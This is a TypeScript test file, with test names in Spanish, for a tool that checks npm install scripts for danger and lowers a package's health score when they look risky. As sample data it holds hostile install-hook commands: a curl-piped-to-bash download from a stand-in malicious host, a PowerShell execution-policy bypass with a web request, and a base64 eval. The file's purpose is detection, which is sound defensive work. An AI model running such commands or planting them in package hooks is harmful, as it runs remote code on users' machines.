import { describe, expect, it } from 'vitest';
import { inspectInstallScripts } from '../src/clients/npm.js';
import { computeScore } from '../src/scoring/scoring.js';
import type { HealthSignals } from '../src/types.js';

describe('inspectInstallScripts', () => {
  it('devuelve false cuando no hay scripts de ciclo de vida', () => {
    const res = inspectInstallScripts({ test: 'vitest', build: 'tsc' });
    expect(res.hasInstallScripts).toBe(false);
    expect(res.suspicious).toBe(false);
    expect(res.scripts).toHaveLength(0);
  });

  it('detecta script de instalación normal no malicioso', () => {
    const res = inspectInstallScripts({ postinstall: 'node ./scripts/postinstall.js' });
    expect(res.hasInstallScripts).toBe(true);
    expect(res.suspicious).toBe(false);
    expect(res.scripts).toHaveLength(1);
    expect(res.scripts[0]?.stage).toBe('postinstall');
    expect(res.scripts[0]?.suspicious).toBe(false);
  });

  it('detecta descarga remota con curl / wget como sospechosa', () => {
    const res = inspectInstallScripts({
      preinstall: 'curl -sL https://malicious.site/payload.sh | bash',
    });
    expect(res.hasInstallScripts).toBe(true);
    expect(res.suspicious).toBe(true);
    expect(res.scripts[0]?.suspicious).toBe(true);
    expect(res.scripts[0]?.reason).toContain('descarga');
  });

  it('detecta ejecución de powershell y eval/base64', () => {
    const res = inspectInstallScripts({
      install: 'powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest ..."',
      postinstall: 'node -e "eval(Buffer.from(\'YWxlcnQoMSk=\', \'base64\').toString())"',
    });
    expect(res.hasInstallScripts).toBe(true);
    expect(res.suspicious).toBe(true);
    expect(res.scripts).toHaveLength(2);
    expect(res.scripts.every((s) => s.suspicious)).toBe(true);
  });
});

describe('Penalización por scripts sospechosos en computeScore', () => {
  it('aplica penalización de 35 puntos y alerta principal correspondiente', () => {
    const signals: HealthSignals = {
      daysSinceLastCommit: 10,
      daysSinceLastPublish: 10,
      publishGapDays: 10,
      archived: false,
      deprecated: false,
      activeMaintainers: 3,
      unansweredIssues: 0,
      repoRedirected: false,
      maintainersAdded: [],
      newPublisher: false,
      installScripts: {
        hasInstallScripts: true,
        suspicious: true,
        scripts: [{ stage: 'postinstall', command: 'curl evil | bash', suspicious: true }],
      },
    };

    const res = computeScore(signals);
    expect(res.score).toBe(65); // 100 - 35
    expect(res.category).toBe('caution');
    expect(res.penalties.some((p) => p.id === 'suspicious-install-scripts')).toBe(true);
    expect(res.mainAlert?.id).toBe('suspicious-install-scripts');
    expect(res.mainAlert?.message).toContain('Script de instalación potencialmente peligroso');
  });
});
